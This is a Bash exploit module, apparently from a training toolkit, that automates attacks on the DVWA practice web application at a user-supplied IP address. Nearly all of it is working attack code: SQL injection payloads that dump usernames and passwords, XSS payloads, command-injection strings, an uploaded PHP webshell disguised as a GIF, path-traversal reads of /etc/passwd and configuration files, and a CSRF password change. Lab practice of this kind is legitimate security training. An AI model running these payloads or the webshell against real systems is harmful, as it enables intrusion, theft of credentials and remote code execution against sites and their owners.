#!/bin/bash
# modules/labs/dvwa/exploits.sh - EXPLOITS AM√âLIOR√âS (d√©tection avanc√©e)

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# FONCTIONS COMMUNES
# ==========================

# D√©tecter le security level
detect_security_level() {
    local cookie_jar="$1"
    local base_url="$2"
    
    local resp=$(curl -s -b "$cookie_jar" "${base_url}/security.php" 2>/dev/null)
    
    if echo "$resp" | grep -q 'selected.*low'; then
        echo "low"
    elif echo "$resp" | grep -q 'selected.*medium'; then
        echo "medium"
    elif echo "$resp" | grep -q 'selected.*high'; then
        echo "high"
    elif echo "$resp" | grep -q 'selected.*impossible'; then
        echo "impossible"
    else
        echo "unknown"
    fi
}

# Forcer security level √† low
force_security_low() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}üîß Tentative de forcer Security Level = Low...${NC}"
    
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -d "security=low&seclev_submit=Submit" \
        "${base_url}/security.php" >/dev/null 2>&1
    
    sleep 1
    
    local new_level=$(detect_security_level "$cookie_jar" "$base_url")
    
    if [ "$new_level" = "low" ]; then
        echo -e "${GREEN}‚úÖ Security Level = Low${NC}"
        return 0
    else
        echo -e "${RED}‚ùå Security Level = $new_level (pas Low)${NC}"
        return 1
    fi
}

# ==========================
# 1. SQL INJECTION (AM√âLIOR√â)
# ==========================

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [SQL Injection - Am√©lior√©]${NC}"
    echo -e "${CYAN}üìñ Objectif : Extraction de donn√©es via SQLi${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Fuite de donn√©es${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    echo -e "\n${YELLOW}üîë Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    local session=$(echo "$result" | cut -d'|' -f2)
    
    if [ -z "$session" ]; then
        echo -e "${RED}‚ùå √âchec authentification${NC}"
        read -p "üëâ Entr√©e..."
        return
    fi
    
    echo -e "${GREEN}‚úÖ Authentifi√© (session: ${session:0:12}...)${NC}"
    
    # V√©rifier/forcer security level
    local sec_level=$(detect_security_level "$cookie_jar" "$BASE")
    echo -e "${CYAN}üîí Security Level d√©tect√©: $sec_level${NC}"
    
    if [ "$sec_level" != "low" ]; then
        force_security_low "$cookie_jar" "$BASE"
    fi
    
    # Payloads SQLi adapt√©s
    local payloads=(
        "1' OR '1'='1"
        "1' OR 1=1 #"
        "' OR '1'='1"
        "1' UNION SELECT null, concat(user,':',password) FROM users #"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test SQLi avec d√©tection avanc√©e...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/sqli/?id=${enc}&Submit=Submit"
        
        echo -e "${CYAN}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # D√©tection multicrit√®res
        local has_data=0
        
        # Crit√®re 1: Pr√©sence de noms d'utilisateurs
        if grep -qi "admin\|gordonb\|pablo\|smithy\|1337" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Usernames d√©tect√©s${NC}"
            has_data=1
        fi
        
        # Crit√®re 2: Structure HTML de r√©sultats
        if grep -q "<pre>.*First name.*Surname" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Structure de r√©sultats d√©tect√©e${NC}"
            has_data=1
        fi
        
        # Crit√®re 3: Patterns SQL typiques
        if grep -qiE "(First name|Surname|ID:)" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Patterns SQL d√©tect√©s${NC}"
            has_data=1
        fi
        
        if [ $has_data -eq 1 ]; then
            echo -e "${GREEN}‚úÖ‚úÖ SQLi SUCCESS - Donn√©es extraites !${NC}"
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi: $payload"
            
            # Extraire et afficher les donn√©es
            echo -e "\n${CYAN}üìä Donn√©es extraites:${NC}"
            grep -oP "ID: \K[0-9]+|First name: \K[^<]+|Surname: \K[^<]+" "$tmpf" | head -n 20
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Pas de donn√©es d√©tect√©es${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}‚ùå Aucun payload n'a fonctionn√©${NC}"
        echo -e "${YELLOW}üí° V√©rifier manuellement le security level dans DVWA${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "üëâ Entr√©e..."
}

# ==========================
# 2. XSS (AM√âLIOR√â)
# ==========================

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [XSS - Am√©lior√©]${NC}"
    echo -e "${CYAN}üìñ Objectif : Injection de scripts${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Session hijacking${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Output encoding, CSP${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Forcer low security
    local sec_level=$(detect_security_level "$cookie_jar" "$BASE")
    [ "$sec_level" != "low" ] && force_security_low "$cookie_jar" "$BASE"
    
    # Payloads XSS vari√©s
    local payloads=(
        '<script>alert(1)</script>'
        '<img src=x onerror=alert(1)>'
        '<svg onload=alert(1)>'
        '"><script>alert(1)</script>'
        '<iframe src=javascript:alert(1)>'
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test XSS avec d√©tection avanc√©e...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/xss_r/?name=${enc}"
        
        echo -e "${CYAN}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
        echo -e "${CYAN}Payload: ${payload:0:40}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # D√©tection multicrit√®res
        local is_reflected=0
        
        # Crit√®re 1: Payload exact non encod√©
        if grep -qF "$payload" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Payload refl√©t√© exactement${NC}"
            is_reflected=1
        fi
        
        # Crit√®re 2: Payload partiellement encod√©
        if grep -qE "<script|<img.*onerror|<svg.*onload|<iframe" "$tmpf"; then
            echo -e "${GREEN}‚úÖ √âl√©ments XSS d√©tect√©s${NC}"
            is_reflected=1
        fi
        
        # Crit√®re 3: Absence d'encodage HTML
        if ! grep -q "&lt;script&gt;\|&lt;img\|htmlspecialchars" "$tmpf"; then
            if grep -qE "script|img|svg|iframe" "$tmpf"; then
                echo -e "${GREEN}‚úÖ Pas d'encodage HTML d√©tect√©${NC}"
                is_reflected=1
            fi
        fi
        
        if [ $is_reflected -eq 1 ]; then
            echo -e "${GREEN}‚úÖ‚úÖ XSS SUCCESS - Payload refl√©t√© !${NC}"
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: ${payload:0:30}"
            
            # Extraire le contexte
            echo -e "\n${CYAN}üìä Contexte d'injection:${NC}"
            grep -o ".{0,50}${payload:0:20}.{0,50}" "$tmpf" | head -n 3
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Payload bloqu√© ou encod√©${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}‚ùå Tous les payloads ont √©t√© bloqu√©s/encod√©s${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "üëâ Entr√©e..."
}

# ==========================
# 3. COMMAND INJECTION (AM√âLIOR√â)
# ==========================

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Command Injection - Am√©lior√©]${NC}"
    echo -e "${CYAN}üìñ Objectif : Ex√©cution commandes OS${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : RCE${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Input validation, whitelist${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Forcer low security
    force_security_low "$cookie_jar" "$BASE"
    
    # Payloads vari√©s avec diff√©rents s√©parateurs
    local payloads=(
        "127.0.0.1;id"
        "127.0.0.1 ; id"
        "127.0.0.1; whoami"
        "127.0.0.1 && id"
        "127.0.0.1 | id"
        "127.0.0.1\nid"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test Command Injection...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/exec/?ip=${enc}&Submit=Submit"
        
        echo -e "${CYAN}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # D√©tection multicrit√®res
        local has_exec=0
        
        # Crit√®re 1: Output typique de id/whoami
        if grep -qE "uid=[0-9]+\(.*\)|gid=[0-9]+\(.*\)" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Output 'id' d√©tect√©${NC}"
            has_exec=1
        fi
        
        # Crit√®re 2: Username syst√®me
        if grep -qE "www-data|root|apache|nginx" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Username syst√®me d√©tect√©${NC}"
            has_exec=1
        fi
        
        # Crit√®re 3: Pr√©sence de <pre> avec contenu syst√®me
        if grep -q "<pre>.*uid=\|<pre>.*www-data" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Bloc <pre> avec output syst√®me${NC}"
            has_exec=1
        fi
        
        if [ $has_exec -eq 1 ]; then
            echo -e "${GREEN}‚úÖ‚úÖ Command Injection SUCCESS !${NC}"
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "CmdInj: $payload"
            
            echo -e "\n${CYAN}üìä Output de la commande:${NC}"
            grep -oP "<pre>\K.*?(?=</pre>)" "$tmpf" | head -n 10
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Pas d'ex√©cution d√©tect√©e${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}‚ùå Aucune ex√©cution de commande d√©tect√©e${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "üëâ Entr√©e..."
}

# ==========================
# 4. FILE UPLOAD (AM√âLIOR√â)
# ==========================

exploit_upload() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [File Upload - Am√©lior√©]${NC}"
    echo -e "${CYAN}üìñ Objectif : Upload webshell${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : RCE${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Type validation, rename${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Forcer low security
    force_security_low "$cookie_jar" "$BASE"
    
    # Cr√©er payloads vari√©s
    local workdir=$(mktemp -d)
    
    # Payload 1: Simple PHP
    cat > "${workdir}/shell.php" <<'SHELL1'
<?php echo "GHOST_".php_uname()."_OK"; ?>
SHELL1
    
    # Payload 2: Image avec PHP
    cat > "${workdir}/shell.php.jpg" <<'SHELL2'
GIF89a
<?php system($_GET['c']); ?>
SHELL2
    
    echo -e "\n${YELLOW}‚è≥ Test upload avec d√©tection avanc√©e...${NC}\n"
    
    local files=("shell.php" "shell.php.jpg")
    local success=0
    
    for file in "${files[@]}"; do
        local filepath="${workdir}/${file}"
        
        echo -e "${CYAN}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
        echo -e "${CYAN}Upload: $file${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 \
            -F "uploaded=@${filepath};filename=${file}" \
            -F "Upload=Upload" \
            "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        
        # D√©tection upload r√©ussi
        if grep -qi "successfully uploaded\|succesfully uploaded\|has been uploaded" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Upload SUCCESS${NC}"
            
            # Tester ex√©cution
            local test_paths=(
                "hackable/uploads/${file}"
                "vulnerabilities/upload/../../hackable/uploads/${file}"
            )
            
            for path in "${test_paths[@]}"; do
                local test_url="${BASE}/${path}"
                
                echo -e "${CYAN}Test exec: $path${NC}"
                
                local exec_resp=$(curl -s --max-time 5 "$test_url" 2>/dev/null)
                
                if echo "$exec_resp" | grep -q "GHOST_.*_OK"; then
                    echo -e "${GREEN}‚úÖ‚úÖ Ex√©cution confirm√©e !${NC}"
                    echo -e "${CYAN}Output: $exec_resp${NC}"
                    log_exploit "${LOG_DIR}/upload.log" "SUCCESS" "Upload+Exec: $file"
                    success=1
                    break 2
                fi
            done
        else
            echo -e "${RED}‚ùå Upload refus√©${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}‚ùå Aucun upload r√©ussi ou ex√©cut√©${NC}"
    fi
    
    rm -rf "$workdir"
    cleanup_cookie_jar "$cookie_jar"
    read -p "üëâ Entr√©e..."
}

# ==========================
# 5. LFI (AM√âLIOR√â)
# ==========================

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [LFI - Am√©lior√©]${NC}"
    echo -e "${CYAN}üìñ Objectif : Lecture fichiers sensibles${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Information disclosure${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Whitelist, chroot${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    # Forcer low security
    force_security_low "$cookie_jar" "$BASE"
    
    # Payloads LFI vari√©s
    local payloads=(
        "../../../../../../etc/passwd"
        "....//....//....//....//....//....//etc/passwd"
        "../../../../../../etc/hosts"
        "php://filter/convert.base64-encode/resource=../../config/config.inc.php"
        "../../../../../../proc/self/environ"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test LFI...${NC}\n"
    
    local success=0
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/fi/?page=${enc}"
        
        echo -e "${CYAN}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
        echo -e "${CYAN}Payload: ${payload:0:50}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        # D√©tection multicrit√®res
        local has_file=0
        
        # Crit√®re 1: /etc/passwd
        if grep -q "root:x:0:0\|nobody:x:" "$tmpf"; then
            echo -e "${GREEN}‚úÖ /etc/passwd d√©tect√©${NC}"
            has_file=1
        fi
        
        # Crit√®re 2: /etc/hosts
        if grep -q "127.0.0.1.*localhost\|::1.*localhost" "$tmpf"; then
            echo -e "${GREEN}‚úÖ /etc/hosts d√©tect√©${NC}"
            has_file=1
        fi
        
        # Crit√®re 3: Base64 (php://filter)
        if echo "$tmpf" | grep -qE "^[A-Za-z0-9+/]{40,}={0,2}$"; then
            echo -e "${GREEN}‚úÖ Contenu base64 d√©tect√©${NC}"
            has_file=1
        fi
        
        # Crit√®re 4: Contenu PHP
        if grep -q "<?php\|DVWA\|\$_DVWA\|db_password" "$tmpf"; then
            echo -e "${GREEN}‚úÖ Fichier PHP expos√©${NC}"
            has_file=1
        fi
        
        if [ $has_file -eq 1 ]; then
            echo -e "${GREEN}‚úÖ‚úÖ LFI SUCCESS - Fichier expos√© !${NC}"
            log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "LFI: ${payload:0:30}"
            
            echo -e "\n${CYAN}üìä Extrait du fichier:${NC}"
            head -n 10 "$tmpf"
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Fichier non accessible${NC}"
        fi
        
        rm -f "$tmpf"
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}‚ùå Aucun fichier accessible${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "üëâ Entr√©e..."
}

# ==========================
# 6. CSRF (D√âJ√Ä BON)
# ==========================

exploit_csrf() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [CSRF]${NC}"
    echo -e "${CYAN}üìñ Objectif : Forcer action non autoris√©e${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Actions au nom de la victime${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : CSRF tokens, SameSite${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    # Login
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    echo -e "\n${YELLOW}üîç R√©cup√©ration formulaire...${NC}"
    
    local form=$(curl -s -b "$cookie_jar" "${BASE}/vulnerabilities/csrf/" 2>/dev/null)
    
    local has_token=$(echo "$form" | grep -o "user_token" 2>/dev/null)
    
    if [ -z "$has_token" ]; then
        echo -e "${GREEN}‚úÖ Pas de token CSRF d√©tect√© (vuln√©rable)${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "CSRF vuln: no token"
    else
        echo -e "${YELLOW}‚ö†Ô∏è Token CSRF pr√©sent: $has_token${NC}"
    fi
    
    echo -e "\n${YELLOW}‚ñ∂ Test changement password sans token...${NC}"
    
    local resp=$(curl -s -b "$cookie_jar" \
        "${BASE}/vulnerabilities/csrf/?password_new=ghost123&password_conf=ghost123&Change=Change" 2>/dev/null)
    
    if echo "$resp" | grep -qi "password.*changed"; then
        echo -e "${GREEN}‚úÖ‚úÖ CSRF SUCCESS - Password chang√© sans token${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "CSRF: password changed"
    else
        echo -e "${RED}‚ùå CSRF √©chou√© (ou token requis)${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "üëâ Entr√©e..."
}

# ==========================
# MENU
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== üí£ Exploits DVWA (AM√âLIOR√âS) ===${NC}"
        echo
        echo -e "${GREEN}1) SQL Injection${NC}      ${YELLOW}[D√©tection avanc√©e]${NC}"
        echo -e "${GREEN}2) XSS${NC}                ${YELLOW}[Multi-payloads]${NC}"
        echo -e "${GREEN}3) Command Injection${NC}  ${YELLOW}[Variantes]${NC}"
        echo -e "${GREEN}4) File Upload${NC}        ${YELLOW}[Multi-extensions]${NC}"
        echo -e "${GREEN}5) LFI${NC}                ${YELLOW}[Filters PHP]${NC}"
        echo -e "${GREEN}6) CSRF${NC}               ${YELLOW}[Token detection]${NC}"
        echo
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            4) exploit_upload ;;
            5) exploit_lfi ;;
            6) exploit_csrf ;;
            0) return ;;
            *)
                echo -e "${RED}‚ùå Invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
